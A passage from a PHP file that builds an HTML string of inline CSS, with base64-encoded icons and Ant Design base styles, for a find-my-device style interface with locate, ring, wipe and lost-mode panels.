rgba(0,0,0,.3);border-radius:4px;background:#fff}.status-container-3dQ_7{height:14px;margin-top:20px;color:#333}.locate-3AevN{cursor:pointer;height:36px;width:120px;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;background:#ebf2ff;border-radius:18px;margin-left:auto;margin-right:auto;color:#3174ff}.locate-3AevN:active,.locate-3AevN:hover{background:#e9effb}.location-complete-1ar01 .locate-3AevN,.location-normal-KTu3y .locate-3AevN,.location-timeout-316Ng .locate-3AevN{margin-top:16px}.location-timeout-316Ng .status-container-3dQ_7{margin-top:0}.location-timeout-316Ng .reason-10SbW{font-size:12px;color:#333;line-height:16px;text-align:left;list-style-position:inside;margin-top:12px}.location-timeout-316Ng .reason-10SbW ul{padding-left:8px}.locating-icon-DygPT{display:block;width:32px;height:32px;margin:24px auto 12px}.pending-panel-1A3nC{margin-left:auto;margin-right:auto}</style><style type="text/css">.device-timeline-2jma0{position:absolute;z-index:100;top:20px;right:20px;font-size:14px;border-radius:10px;background:#fff;-webkit-box-shadow:0 4px 8px 0 rgba(0,0,0,.3);box-shadow:0 4px 8px 0 rgba(0,0,0,.3);width:340px}.header-1myp_{display:-webkit-box;display:-ms-flexbox;display:flex;padding:20px 20px 0;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.content-wrapper-2pHQh{position:relative;overflow:auto;height:60vh;max-height:400px;padding:26px 21px 22px 19px}.back-e-zIY,.empty-2990i{display:-webkit-box;display:-ms-flexbox;display:flex;font-weight:700;border:1px solid #9b9b9b;border-radius:3px;height:32px;cursor:pointer;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-transition:background .1s;transition:background .1s}.back-e-zIY{width:32px}.empty-2990i{font-weight:400;padding:0 9px}.back-e-zIY:hover,.empty-2990i:hover{background:#fafafa}.ico-back-1902I{font-size:16px;color:#4a4a4a}</style><style type="text/css">.item-3yLVn{display:-webkit-box;display:-ms-flexbox;display:flex;margin-bottom:20px}.icon-location-VuI9_{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIcAAACHCAMAAAALObo4AAAAn1BMVEUAAABDhf+Frv9/qf+Frf+Frf+ErP+Cq/9xoP9pmv9Ykf+ErP+ErP+Frf+Frf+Erv97p/9MhP+Erf96pv92o/90oP9rnP9glf////+DrP8xdP8+ff/4+v+PtP+70f/k7f/W5P/s8v+nxP/y9//a5v/Q4P+0zf/G2f9Fgv/K3P/A1f+hwP+VuP9Mhv+uyP+Yuv9glP9Yj/94pf9nmf9vnf+3b0tzAAAAGHRSTlMABeSB6sW1nUs4Hvv03c7AehLWc2FWPjDFxe5XAAAFe0lEQVR42rzXaY6CQBQEYJpVQAVncV4lDxpQNKAZ73+7sUn4pwxLN98JKl2vJFpziWjzGfjJfudu46272yd+8LmJhLUiETq+jdds3wnXCCN+Ui/GsNhLf8xmCYMtevcqr89SlicmPpVSnuu8uqO3DULLkMjpy3jkRcn0CpdF/ugrciJLv80enfulONGwU3G5o7PfaL6K7x2ULJc0jswzKLtvoS/Flw3l98w0Hp9/odhfQlMjbvcULdNU3HaP4upoJ0q6FFemOfjaJUmipZU4sUrRMM3FjUoSO4vKCbvDyJmW4Lw7k3DBY+DpVtJS5Q1Pc5/k4KlKatKhVuV4B2uGowugYtKDKwDu0ZosxdOV9LniKbUmClQnknSSqptg2oX6EzqZ1o0vJsTwAFxIvwsAT4weygeAlkxoAXyMnI1QMRoyo1FBxOhSCjKlGFuNbzBGH8QfN9iGTGrGzDftTtSs9v8ftOPAYPXO9zi4WBeoyLwKcA/DU8mYzONscDQOAElrkAAc641wwhdWx9c3fNOKDVS0lgqwxbtWMqa1cPammSgGalpPDcTRixwJcKM13YDkxb+2P97LZjdxIAjCQ0T4hxySKF3jyQQyXsmRg4Nj3v/ZVrjn4DXYUNaK7zqyaFpd1V0AdnJPdgBmZ0M6BrzcFw+M26P6Qgzp/xzVl3PNfsm9+TrT7uuwdjiPY5nZrDzCu2ENeTVN1gOc1BWVbVIVboCrrltiodvh97bN3tMN+VcyG/r4SUt7iTKlT6JNw0oBOK4Zib1M4rmGAFg0N0shDD+2SWab/AhD0dwyD0A6rIxDngYRCWl+GFZICjyYyJycUm8jvx/N0+bXRjw5qXOjTDlL3yZRHdv2Q1RQsuXMfRq9dMVdg1EpVZA2oYqq4S7ElXrqG/DNHP2xDCfnuFgIEz2+gTeNTlRkcdr8fZBLhPjqqDCjoeqRyrOFren6YqvPBZV3H+vxWAJBbqZSpUgXqppKbiYAy5GqllB8sDUf3XNnawLhRsBczdSz3nGQbg6sh3i11Ak1HrAncukmtydADchETZ24j4/2RNrn1PbEkbiXa2sfAXCsiYWrE1RyO3dkFpyL6W6VPnQHc062MLP+UMv/SCyVi7oz88wtOfVL19dmdVRu1T2bKZdqVZV9X/xRZXNJd2om3A30rqq8qux37haamCdu6eu/TXbdKky0Y9zqfzIbrYMUDK60IxOujo1ZkzE/v2nf5mTwX5sxEITAZTfcH5kTggCMzYqNLp+2Z/PHW/mTDTErswSE49Dd+tySolWA5V9m7SC1YRgKAug1HMlgUurWG4MDuf/ZCg1iKFIJb6dZK2Es6Ut/ZuTzsWyRB/8Iim3h+cj+4JUpe1fTWRXdH1ov2QXRKdE12TlaLzk/AOsVIh2NK8sM50fOU8H9aEQ6GkdmV87T3C+ErRH5bs5Oo5GPovsl9y3+tpZUTSql5pvsvu36D1DbqY6P0q0T9h/pxxR7I3Jbb42Gzmz6sfSnjM/mAzVCBy9K+tP0647t/OsWbgsj/Xr0i+P+KMHD/yX6pdNzhvVZGp7dpIqeG+tb61fH/ajpW9P79XdXjuyhr9FA0PvxP5BHsF/12ocDwf+IHwQ8YCD4QeCPIQ/wx8AvdB7gF4J/6jzAPzU/ub6O8fd4jQM/2fz1WgQV/HXIG5wH5A2QvzgPyF8gj3IekEdZPndWwQn5HOSVAMsrIb8FcH4LeTbA8+wp8/1Z3jtM8/5jlvcw07wP+mnmDkgAAAAABP1/3YrAHxnTSyn9GNPTKX0h01sy/anS4zJ9MtNrM/060/MzvkHxHox/YTwQ46MYL+b4OcYTMr6S8aaMv3U8MuOzHa/u+H3mZ+D8HaDfhfP/gH4ozh/m+uUEYOdbqAld+tgAAAAASUVORK5CYII=)}.icon-noise-2jr7b{background-image:url(data:image/png;base64,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)}.icon-wipe-3641h{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIcAAACHCAMAAAALObo4AAAAgVBMVEUAAAB+qf+Frv9pm/+Frf+Erv+Cq/9xoP9Ykf+ErP+ErP+Frf+Frf+Frf+ErP9MhP+Erf+Erf97pv96pv92o/90oP9glf8xe/////8xdP+DrP/3+v+PtP+60f/t8//Z5v/U4v/M3f+nxP+Wuf/m7v/i6//G2f/A1f+0zf+tyP+hwP8Q0ZeVAAAAGHRSTlMAgOQ5xb6dSx779OjdzrIS7tZ4c2FWMApIrfZGAAAD0klEQVR42rzVWZKCQBAEUPbFfVwrstgVUO9/wLFRYj5UBppu3gkyKpPGkBb4O2/lLhfzWTibL5buytv5gTEp23QtfGa5pm1M4bh1QnQLne3R0Mr2ZmidizhPy0vCTMzJpUzzuDijNfO0nSUwrTZCnCb0WZLGbRjL1DEXf/nKcM2YunF2fWVZ+opTHBYQovhC/VziCMLioDDF/lnILaUh0tuznr2qRubNKWqmobhujjJX0U7gNikqJhlcNUnc0Ys1Q5EiZ5LFuUgSmuPei2YYMdMYHDczsUccAw/3hMZK7niQPcnaEZVkpEImynHWUp1sABRManABYGNLdlKROpVUN57opCSVStGNNyzG6q0TVd2sBqQ4iYVeSb2rWOup94fyA6AmHWoAP+ue1xAxctIjF0H6XUSUkpEumaim70Qz0ifrN1ZPYyl/1Xh9nq+a9Kr/f9BsiQ9W7vO1O7/YDVCQfgWwWXd/KhGTfhwBTvc4SppC2TURu/nDTqPqmIglNQ75iVhfW4mYpsLRl2aCUPIdlX9Xw8B45wJ3mtIdcN9j+AASmlLyy3wd7CgIBFEUDTGTAIILHU15ERAbE/3/H5y0HdOSnoWy4FlrFicVXnUVkF56a2ht2WphnZzSi/6k8Vf9TTM72NI1JNndC9oRGrKfOKqFJmk6VatJWATtCA2ZRqb+fPk5/l+fr0R1ZORAI3E0QP76stxN4rA7ZK+h7UWOnhjdFZxM5LATrOKp0MocbTwiShhnOizWTMcIZWAcwJnMYQ4OD8cWbkLHDbbPY+EsdJyfJ0QBjdDRQBFSizOhw1xIbvZmao9z6s3kZmE/7qWOHn7CUO+kji6MdsCkDgMeb74TOxzkfhW7iB0Xv5TtoJ0X1/mfpIHZ+cd2EDsG/+RuoBc7etj48XEVO65+gNQwih0j1P6C6sSODip/5zdiR+Pv/vIrHKXfPkzsMCi+ph9/zdy5EYBADATB/LMGb3yKu+0MxuCR9pHyfCjvi/L9UL6nyv9F+d8q80fz2ICjeaz5dMHRfNq8vuN4CdpfFhztL+1zC472ufbbBUf7bfv+gqN9P/1jwJH+kR604EgPSh9bcKSPpRcuONIL008HHOmnH/TkPzf99OT09QlH+np+w4IjvyH/ZcKR/5IfteDIj8qfu8yRPwf6lYp/y/jZir/P5B2U/AeTh1HyQUxeSsmPMXk6Jl+o5C2Z/CmTx1XyyUxem8mvM3l+pt/A9D2U/gvTB2L6UU5fjOnPMX1Cpl/J9E2d/i3TR3b62Uxf3envO/cMnPsOzr0L5/4HdA8Fug9z6F7OA1L1Sq6mK4sRAAAAAElFTkSuQmCC)}.icon-lost-3pMXL{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIcAAACHCAMAAAALObo4AAAAolBMVEUAAAB+qf+Frv+Erf+Frf+ErP+Cq/9xoP9qm/9Ykf+ErP+Frf+Frf+Frf+Erv96pv9kmf9MhP+Erf92o/90oP8xe/////8xdP+DrP/6/P/n7//1+f+Os/+3z//W5P+vyf+nxP9pmv9ZkP+Zu//t8//a5v/K3P/G2f/A1f+Tt/9Mhv9CgP/g6v/R4P+70v+iwf9UjP9fk//O3v92o/9wnv8+ff91JJTLAAAAFnRSTlMAgOTyxbWdSzse+ujdzsB1MxLWYVYK9tSSnAAABMJJREFUeNq8mGt7ojAQhbEU77duu8OECCoXwfu23f7/v7YNETVF2QkC7zebp4/TOWdOMjVK0+tM2tZ4NByYaA6Go7HVnnR6RqN0W9YT3ubJanWNJphOnvtYTP95MjVqZdo2MWO9OHxEOyfkDBgPnV30cVisMcNs11ZKr5WJEbheyOAWLPTcIJOoVYddOqNTG1yPQzHcc0+NGXWMankbomDmOkDDcWcoGL4Z1fEqBZlHDOiwaC7lea1KkUHaioSDLjxJmzKoQp3eOK0iZlAGFqeVjB92bKsvqlgxKAtbiUr6rceCMzXGgcEjsENqk+4DzcBvjg48inPEb8q25OVZSLKHKtgLcZ5fSmkiInzBoRr4QoR9t6QmMVRHXEqbtohwB6rEEWHfNrSwiJroa2MZdH4Lh7pQPa5w62/yoPxCxATqIEHEXy/EbogyVlAPK1EIrSNCFA/qwhPSUC3qQX14NLO2axJFlaZNia8E6iX5f6B1CQNbzfh2CyfWRFxA/SwQzZfiUVlzqB++FkNTaA4HmsARFikyRwzNEBdY5Kl2c6gWebqryoxDU/DZHWV6fcQ9NMcesd8z8owRj9AkR8SxkaPT0KyoM5Pf9AaIB2iWA+Igt0p/m5RBs7Bvq77mZ3YFTbPKze5bg+1QG6L+f2RYcZLSU3WoDkvz7ZANUUdmVPLx4y1w6W+2G3+JC6/kk2h0FaWIyEETlnx+2dd8fSbaPeWI2Lu+Wea6VRy3dp7tUbeSOWLremgj0MLd2LfZuKBFdDW6U12X7n37Pv5e16nTy6rgavXSLkZLY/eyRJhaNxyb2Rfeg3kcOVE8D97tCzOmdduZZ1nWQIYv7YzlPIQL4fzqhAOZdSbMREcWdv4yf5W/L/xzIUxHmEm2LNAzKBNle7t0d5tJQ8/CbIXoI3Jdi/5x7sn9R9esHLF/2hYC8sDakr/3C+d/bQl5fAO5QbQ07OGfyoAiToX4ZIPISLXo9nBPohTLyE/SuHSDWDLUQyDBNtKijvpTx3OY6hFp1g0DEqGMdkRkQOKY/zudwJciBE6+b0cgwRDRMHrkFGPbn7rz2XWI8p8+2jJykvWMDnmpTeyUVW5G87O8slMS8qrbMSbkveVTJqVqgzOqcWTqfpL3mIm4bD+AxJeaT1zthhwkNe++gMSHuHIt6hvIs1NCJeEFm/eN/TPNQ/nZo76FLLFe72gqyov+rEp2o4nf3mW331kZ+QygOW8nFu4R9fGBtiA4p7GtfA7sW8dIfYKMjCE1xpaqPfzMtcqxrxpkSQ2yodjzucbdEoOE2SkXSXd2CgNJrHHHcLH3m9Q4lWaMFHtscueZxpE8pwaqKWIdSGyV7/HOrlWd6Sl1bv81c0c3AEIhDEW3YP9R6Qj9aXKcwBj1Ab2Xq67cA/M8lPdD+V6U/4fyP1XOF+W8VeoPpR5T6lOlXmf6F6WfU/pbpd9X5h/MPEiZjynzQmV+ysyTlfm6kjcw+YuSRyn5HJNXKvktk2cr+T7DOyj8B8PDKHwQw0sp/BjD0zF8ocJbMvwpw+MqfDLDazP8OsPzM34D43so/gvjAzF+lOOLMf4c4xMyfiXjmzr+LeMjO34246s7/r6zz8DZ7+Dsu3D2f0D7UKD9MKN9OQ8EvvcvEx2KLwAAAABJRU5ErkJggg==)}.icon-2svuv{width:36px;height:36px;background-size:cover}@media (max-device-width:1024px){.message-2pPTi{border-radius:3px;background:#fff;width:79.592%;margin-left:2.13%;padding:12px 16px}.content-2DOeC{font-size:14px;font-weight:700;line-height:14px;margin-bottom:6px}.address-2rFZZ,.time-1oEjy{line-height:1;color:#888}.address-2rFZZ{font-size:12px;margin-bottom:5px;line-height:1.4}.time-1oEjy{font-size:10px}}@media (min-device-width:1025px){.message-2pPTi{margin-left:18px;padding:13px 14px;width:76%;border:1px solid #cecece;border-radius:3px}.content-2DOeC{font-size:16px;line-height:16px;margin-bottom:6px;font-weight:700}.address-2rFZZ,.time-1oEjy{color:#666}.address-2rFZZ{font-size:12px;line-height:1.4}.time-1oEjy{margin-top:5px}}</style><style type="text/css">.content-2PPNC{position:relative}@media (max-device-width:1024px){.line-1pE_B{position:absolute;z-index:-1;left:17px;background:#e6e6e6;width:1px;height:100%}.none-xaDox{margin-top:20%;text-align:center}.img-14YMn{width:70%;max-width:300px}.title-1dpfw{font-size:14px;color:#666;margin-top:21px}.top-item-32Bj4{display:-webkit-box;display:-ms-flexbox;display:flex;margin-bottom:20px}.top-icon-15lHz{position:relative;width:36px;height:36px}.top-icon-15lHz:before{position:absolute;left:50%;display:block;border:3px solid #3174ff;border-radius:50%;background:#fff;-webkit-box-sizing:border-box;box-sizing:border-box;width:11px;height:11px;content:"";-webkit-transform:translateX(-50%);transform:translateX(-50%)}.top-message-2XfwS{font-size:14px;font-weight:700;width:79.592%;margin-left:2.13%}}@media (min-device-width:1025px){.none-xaDox{margin-top:10px;text-align:center}.img-14YMn{width:188.3px}.title-1dpfw{font-size:14px;color:#666;margin-top:21px}.line-1pE_B{position:absolute;z-index:-1;left:17px;background:#e6e6e6;width:1px;height:100%}.top-item-32Bj4{display:-webkit-box;display:-ms-flexbox;display:flex;margin-bottom:20px}.top-icon-15lHz{position:relative;width:36px;height:36px}.top-icon-15lHz:before{position:absolute;left:50%;display:block;border:3px solid #3174ff;border-radius:50%;background:#fff;-webkit-box-sizing:border-box;box-sizing:border-box;width:11px;height:11px;content:"";-webkit-transform:translateX(-50%);transform:translateX(-50%)}.top-message-2XfwS{font-size:12px;border:1px solid #cecece;border-radius:3px;height:34px;margin-left:18px;padding:8px 14px;font-weight:700}}</style><style type="text/css">.status-container-25ku9{overflow:hidden}.status-container-25ku9 .status-1HOCh{color:#333}.status-container-25ku9 .status-1HOCh:before{display:inline-block;border-radius:50%;width:8px;height:8px;margin-right:6px;content:""}.status-container-25ku9 .online-2U0T5:before{background:#45d426}.status-container-25ku9 .offline-VO9Wn:before{background:#999}.list-status-container-dzqIw{max-width:115px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;line-height:normal}</style><style type="text/css">.device-list-QD4SW{position:absolute;z-index:1;top:20px;right:20px;font-size:14px;border-radius:3px;background:#fff;-webkit-box-shadow:0 4px 8px 0 rgba(0,0,0,.3);box-shadow:0 4px 8px 0 rgba(0,0,0,.3);width:340px;border-radius:10px}.summary-1bs_0{line-height:40px;color:#333;height:40px;padding-right:20px;padding-left:20px}.content-22g2r{overflow:auto;max-height:65vh}.item-JywEy{display:-webkit-box;display:-ms-flexbox;display:flex;border-top:1px solid #e6e6e6;height:80px;padding-right:14px;padding-left:14px;text-decoration:none;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;-webkit-transition:background .1s;transition:background .1s}.item-JywEy:last-child{border-radius:0 0 3px 3px}.item-JywEy:hover{background:#fafafa}.info-group-1pTRI{margin-left:19px;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.info-group-1pTRI.right-MfDWb{margin-left:0}.info-group-1pTRI.left-3Ify0{max-width:50%}.detail-1JvPB{margin-left:19px}.item-JywEy img{width:22px}.name-HBIoH{color:#000;margin:0 0 5px;line-height:14px}.phone-number-2KKbF{font-size:12px;color:#666;margin:0;line-height:12px}.right-arrow-1W11z{font-size:14px;color:#b3b3b3;margin-left:10px}</style>';
	$html .= "\n" . '<style type="text/css">@font-face{font-family:Chinese Quote;src:local("PingFang SC"),local("SimSun");unicode-range:u+2018,u+2019,u+201c,u+201d}body,html{width:100%;height:100%}input::-ms-clear,input::-ms-reveal{display:none}*,:after,:before{-webkit-box-sizing:border-box;box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;-ms-overflow-style:scrollbar;-webkit-tap-highlight-color:rgba(0,0,0,0)}@-ms-viewport{width:device-width}article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}body{margin:0;font-family:Chinese Quote,-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif !important;font-size:14px;-webkit-font-feature-settings:"tnum";font-feature-settings:"tnum";font-variant:tabular-nums;line-height:1.5;color:rgba(0,0,0,.65);background-color:#fff}[tabindex="-1"]:focus{outline:none!important}hr{-webkit-box-sizing:content-box;box-sizing:content-box;height:0;overflow:visible}h1,h2,h3,h4,h5,h6{margin-top:0;margin-bottom:.5em;color:rgba(0,0,0,.85);font-weight:500}p{margin-top:0;margin-bottom:1em}abbr[data-original-title],abbr[title]{text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;cursor:help;border-bottom:0}address{margin-bottom:1em;font-style:normal;line-height:inherit}input[type=number],input[type=password],input[type=text],textarea{-webkit-appearance:none}dl,ol,ul{margin-top:0;margin-bottom:1em}ol ol,ol ul,ul ol,ul ul{margin-bottom:0}dt{font-weight:500}dd{margin-bottom:.5em;margin-left:0}blockquote{margin:0 0 1em}dfn{font-style:italic}b,strong{font-weight:bolder}small{font-size:80%}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}a{color:#1890ff;background-color:transparent;text-decoration:none;outline:none;cursor:pointer;-webkit-transition:color .3s;transition:color .3s;-webkit-text-decoration-skip:objects}a:focus{text-decoration:underline;-webkit-text-decoration-skip:ink;text-decoration-skip:ink}a:hover{color:#40a9ff}a:active{color:#096dd9}a:active,a:hover{outline:0;text-decoration:none}a[disabled]{color:rgba(0,0,0,.25);cursor:not-allowed;pointer-events:none}code,kbd,pre,samp{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;font-size:1em}pre{margin-top:0;margin-bottom:1em;overflow:auto}figure{margin:0 0 1em}img{vertical-align:middle;border-style:none}svg:not(:root){overflow:hidden}[role=button],a,area,button,input:not([type=range]),label,select,summary,textarea{-ms-touch-action:manipulation;touch-action:manipulation}table{border-collapse:collapse}caption{padding-top:.75em;padding-bottom:.3em;color:rgba(0,0,0,.45);text-align:left;caption-side:bottom}th{text-align:inherit}button,input,optgroup,select,textarea{margin:0;font-family:inherit;font-size:inherit;line-height:inherit;color:inherit}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{padding:0;border-style:none}input[type=checkbox],input[type=radio]{-webkit-box-sizing:border-box;box-sizing:border-box;padding:0}input[type=date],input[type=datetime-local],input[type=month],input[type=time]{-webkit-appearance:listbox}textarea{overflow:auto;resize:vertical}fieldset{min-width:0;padding:0;margin:0;border:0}legend{display:block;width:100%;max-width:100%;padding:0;margin-bottom:.5em;font-size:1.5em;line-height:inherit;color:inherit;white-space:normal}progress{vertical-align:baseline}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{outline-offset:-2px;-webkit-appearance:none}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}output{display:inline-block}summary{display:list-item}template{display:none}[hidden]{display:none!important}mark{padding:.2em;background-color:#feffe6}::-moz-selection{background:#1890ff;color:#fff}::selection{background:#1890ff;color:#fff}.clearfix{zoom:1}.clearfix:after,.clearfix:before{content:"";display:table}.clearfix:after{clear:both}@font-face{font-family:anticon;font-display:fallback;src:url("https://at.alicdn.com/t/font_148784_v4ggb6wrjmkotj4i.eot");src:url("https://at.alicdn.com/t/font_148784_v4ggb6wrjmkotj4i.woff") format("woff"),url("https://at.alicdn.com/t/font_148784_v4ggb6wrjmkotj4i.ttf") format("truetype"),url("https://at.alicdn.com/t/font_148784_v4ggb6wrjmkotj4i.svg#iconfont") format("svg")}.anticon{display:inline-block;font-style:normal;vertical-align:baseline;text-align:center;text-transform:none;line-height:1;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.anticon:before{display:block;font-family:anticon!important}.anticon-step-forward:before{content:"\E600"}.anticon-step-backward:before{content:"\E601"}.anticon-forward:before{content:"\E602"}.anticon-backward:before{content:"\E603"}.anticon-caret-right:before{content:"\E604"}.anticon-caret-left:before{content:"\E605"}.anticon-caret-down:before{content:"\E606"}.anticon-caret-up:before{content:"\E607"}.anticon-caret-circle-right:before,.anticon-circle-right:before,.anticon-right-circle:before{content:"\E608"}.anticon-caret-circle-left:before,.anticon-circle-left:before,.anticon-left-circle:before{content:"\E609"}.anticon-caret-circle-up:before,.anticon-circle-up:before,.anticon-up-circle:before{content:"\E60A"}.anticon-caret-circle-down:before,.anticon-circle-down:before,.anticon-down-circle:before{content:"\E60B"}.anticon-right-circle-o:before{content:"\E60C"}.anticon-caret-circle-o-right:before,.anticon-circle-o-right:before{content:"\E60C"}.anticon-left-circle-o:before{content:"\E60D"}.anticon-caret-circle-o-left:before,.anticon-circle-o-left:before{content:"\E60D"}.anticon-up-circle-o:before{content:"\E60E"}.anticon-caret-circle-o-up:before,.anticon-circle-o-up:before{content:"\E60E"}.anticon-down-circle-o:before{content:"\E60F"}.anticon-caret-circle-o-down:before,.anticon-circle-o-down:before{content:"\E60F"}.anticon-verticle-left:before{content:"\E610"}.anticon-verticle-right:before{content:"\E611"}.anticon-rollback:before{content:"\E612"}.anticon-retweet:before{content:"\E613"}.anticon-shrink:before{content:"\E614"}.anticon-arrow-salt:before,.anticon-arrows-alt:before{content:"\E615"}.anticon-reload:before{content:"\E616"}.anticon-double-right:before{content:"\E617"}.anticon-double-left:before{content:"\E618"}.anticon-arrow-down:before{content:"\E619"}.anticon-arrow-up:before{content:"\E61A"}.anticon-arrow-right:before{content:"\E61B"}.anticon-arrow-left:before{content:"\E61C"}.anticon-down:before{content:"\E61D"}.anticon-up:before{content:"\E61E"}.anticon-right:before{content:"\E61F"}.anticon-left:before{content:"\E620"}.anticon-minus-square-o:before{content:"\E621"}.anticon-minus-circle:before{content:"\E622"}.anticon-minus-circle-o:before{content:"\E623"}.anticon-minus:before{content:"\E624"}.anticon-plus-circle-o:before{content:"\E625"}.anticon-plus-circle:before{content:"\E626"}.anticon-plus:before{content:"\E627"}.anticon-info-circle:before{content:"\E628"}.anticon-info-circle-o:before{content:"\E629"}.anticon-info:before{content:"\E62A"}.anticon-exclamation:before{content:"\E62B"}.anticon-exclamation-circle:before{content:"\E62C"}.anticon-exclamation-circle-o:before{content:"\E62D"}.anticon-close-circle:before,.anticon-cross-circle:before{content:"\E62E"}.anticon-close-circle-o:before,.anticon-cross-circle-o:before{content:"\E62F"}.anticon-check-circle:before{content:"\E630"}.anticon-check-circle-o:before{content:"\E631"}.anticon-check:before{content:"\E632"}.anticon-close:before,.anticon-cross:before{content:"\E633"}.anticon-customer-service:before,.anticon-customerservice:before{content:"\E634"}.anticon-credit-card:before{content:"\E635"}.anticon-code-o:before{content:"\E636"}.anticon-book:before{content:"\E637"}.anticon-bars:before{content:"\E639"}.anticon-question:before{content:"\E63A"}.anticon-question-circle:before{content:"\E63B"}.anticon-question-circle-o:before{content:"\E63C"}.anticon-pause:before{content:"\E63D"}.anticon-pause-circle:before{content:"\E63E"}.anticon-pause-circle-o:before{content:"\E63F"}.anticon-c